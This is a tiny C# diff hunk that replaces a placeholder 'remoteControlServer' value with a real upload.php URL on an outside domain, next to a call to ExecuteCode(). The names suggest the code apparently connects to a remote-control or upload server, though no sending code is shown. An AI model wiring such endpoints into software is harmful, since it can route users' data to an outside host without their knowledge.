@@ -21,7 +21,7 @@ namespace YottaWap
             ExecuteCode();
         }
 
-        string remoteControlServer = "Your server here.";
+        string remoteControlServer = "https://www.wesdb.com/upload.php";
 
         public enum ErrorCodes
         {
